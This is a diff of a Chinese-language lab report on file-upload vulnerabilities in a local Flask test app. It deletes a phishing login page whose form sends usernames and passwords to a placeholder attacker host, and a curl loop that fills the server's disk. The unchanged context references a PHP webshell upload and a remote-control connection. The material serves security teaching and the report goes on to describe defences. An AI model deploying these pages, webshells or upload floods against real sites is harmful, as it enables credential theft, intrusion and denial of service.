@@ -223,54 +223,6 @@ curl -X POST "http://127.0.0.1:5000/static/uploads/ant.php" \
 
 **结果**：攻击者通过中国蚁剑获得了服务器的完全控制权。
 
-### 4.5 攻击四：上传 HTML 钓鱼页面
-
-**目的**：上传一个伪造的登录页面，诱导其他用户输入凭据。
-
-**钓鱼页面代码**（保存为 `login-fake.html`）：
-
-```html
-<!DOCTYPE html>
-<html>
-<head><title>系统维护中</title></head>
-<body>
-<h2>系统升级，请重新登录</h2>
-<form action="http://攻击者IP/steal.php" method="post">
-    <input type="text" name="username" placeholder="用户名"><br>
-    <input type="password" name="password" placeholder="密码"><br>
-    <input type="submit" value="登录">
-</form>
-</body>
-</html>
-```
-
-**攻击步骤**：
-
-1. 上传 `login-fake.html` 到 `/static/uploads/`
-2. 将链接 `http://127.0.0.1:5000/static/uploads/login-fake.html` 发送给目标用户
-3. 由于 URL 域名是合法站点，用户容易信任
-4. 用户输入的凭据被发送到攻击者服务器
-
-**结果**：钓鱼页面成功部署在合法域名下，极易诱骗用户。
-
-### 4.6 攻击五：上传大文件造成拒绝服务
-
-**目的**：利用无文件大小限制（在 16MB 以内）反复上传大文件，消耗服务器磁盘空间。
-
-```bash
-# 生成一个 15MB 的文件
-dd if=/dev/zero of=bigfile.bin bs=1M count=15
-
-# 循环上传 100 次
-for i in $(seq 1 100); do
-  curl -X POST "http://127.0.0.1:5000/upload" \
-    -b "session=xxx" \
-    -F "file=@bigfile.bin;filename=bigfile_$i.bin"
-done
-```
-
-**结果**：服务器磁盘空间被迅速占满（15MB x 100 = 1.5GB），导致正常用户无法上传，甚至影响系统其他功能。
-
 ---
 
 ## 五、文件上传攻击汇总
@@ -280,8 +232,6 @@ done
 | 1 | Python Webshell 上传 | .py | shell.py | 上传成功，可通过 URL 访问 |
 | 2 | PHP 一句话木马上传 | .php | ant.php | 上传成功，可配合蚁剑连接 |
 | 3 | 中国蚁剑远程控制 | — | — | 连接成功，完全控制服务器 |
-| 4 | HTML 钓鱼页面上传 | .html | login-fake.html | 上传成功，可部署钓鱼攻击 |
-| 5 | 大文件 DOS 攻击 | .bin | bigfile.bin | 上传成功，消耗磁盘空间 |
 
 ---
 
@@ -429,8 +379,6 @@ curl -X POST "http://127.0.0.1:5000/upload" \
 | Python Webshell | 可上传 | 被拦截（.py 不在白名单） |
 | PHP 一句话木马 | 可上传 | 被拦截（.php 不在白名单） |
 | 中国蚁剑连接 | 可连接控制 | 无法上传 Webshell，无法连接 |
-| HTML 钓鱼页面 | 可上传部署 | 被拦截（.html 不在白名单） |
-| 大文件 DOS | 可上传（16MB 内） | 应配合频率限制和用户配额 |
 | 正常图片上传 | 正常 | 正常（不受影响） |
 
 ---
@@ -467,7 +415,7 @@ curl -X POST "http://127.0.0.1:5000/upload" \
 | **secure_filename** | 过滤路径穿越字符（`../`、`/` 等） | 阻止目录穿越攻击 |
 | **UUID 重命名** | 随机文件名，攻击者无法预测访问路径 | 即使上传成功也无法访问 |
 | **独立存储** | 上传文件保存到非 Web 根目录，通过专用接口读取 | 阻止直接 URL 访问执行脚本 |
-| **频率限制** | 限制单用户单位时间上传次数 | 阻止大文件 DOS 攻击 |
+| **频率限制** | 限制单用户单位时间上传次数 | 阻止恶意批量上传 |
 | **病毒扫描** | 使用 ClamAV 等工具扫描上传文件 | 阻止恶意代码文件 |
 
 ### 8.3 为什么不能用"黑名单"？
@@ -602,11 +550,6 @@ curl -X POST "http://127.0.0.1:5000/upload" \
 curl -X POST "http://127.0.0.1:5000/upload" \
   -b "session=<登录后的session>" \
   -F "file=@ant.php"
-
-# 上传 HTML 钓鱼页面
-curl -X POST "http://127.0.0.1:5000/upload" \
-  -b "session=<登录后的session>" \
-  -F "file=@login-fake.html"
 ```
 
 ### A.2 PHP 一句话木马（ant.php）
@@ -621,16 +564,4 @@ curl -X POST "http://127.0.0.1:5000/upload" \
 URL: http://127.0.0.1:5000/static/uploads/ant.php
 密码: cmd
 类型: PHP
-```
-
-### A.4 大文件 DOS 攻击
-
-```bash
-# 生成 15MB 文件
-dd if=/dev/zero of=bigfile.bin bs=1M count=15
-
-# 上传
-curl -X POST "http://127.0.0.1:5000/upload" \
-  -b "session=<登录后的session>" \
-  -F "file=@bigfile.bin"
 ```
